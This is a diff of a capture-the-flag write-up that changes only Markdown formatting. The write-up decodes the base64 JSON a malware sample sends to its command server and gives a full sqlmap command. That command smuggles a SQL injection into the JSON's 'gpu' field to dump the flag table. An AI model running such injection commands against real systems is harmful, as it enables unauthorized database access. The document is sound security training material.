@@ -12,7 +12,9 @@ FIXME: Add the file
 ## Challenge resolution
 FIXME: first step
 
-The following base64 is sent over HTTP to the C2 by the malware: eyJjaWQiOiJERVNLVE9QLUQwMjE0VjgiLCJjcHUiOiJJbnRlbChSKSBDb3JlKFRNKSBpNS00MzEwVSBDUFUgQCAyLjAwR0h6IiwiZ3B1IjoiQ2FydGUgdmlkw6lvIGRlIGJhc2UgTWljcm9zb2Z0In0=
+The following base64 is sent over HTTP to the C2 by the malware: 
+
+```eyJjaWQiOiJERVNLVE9QLUQwMjE0VjgiLCJjcHUiOiJJbnRlbChSKSBDb3JlKFRNKSBpNS00MzEwVSBDUFUgQCAyLjAwR0h6IiwiZ3B1IjoiQ2FydGUgdmlkw6lvIGRlIGJhc2UgTWljcm9zb2Z0In0=```
 The decoded base64 is a json object:
 ```
 {
@@ -39,6 +41,7 @@ Content-Type: application/x-www-form-urlencoded
 ```
 
 And run the following sqlmap command:
+
 ``$ sqlmap -r raw_request --tamper base64encode --prefix $'{"cid":"DESKTOP-D0214V8","cpu":"Intel(R) Core(TM) i5-4310U CPU @ 2.00GHz","gpu":"\' or 1=1 ' --suffix ' -- a"}' --skip-urlencode --level 5 --string go --technique B --dump``
 
 Finaly, we retrieve the flag from the flag tables: INS{M1ninG_i5_t0o_H4rD_Lets_D0_Norm4l_Cyb3rCr1me}
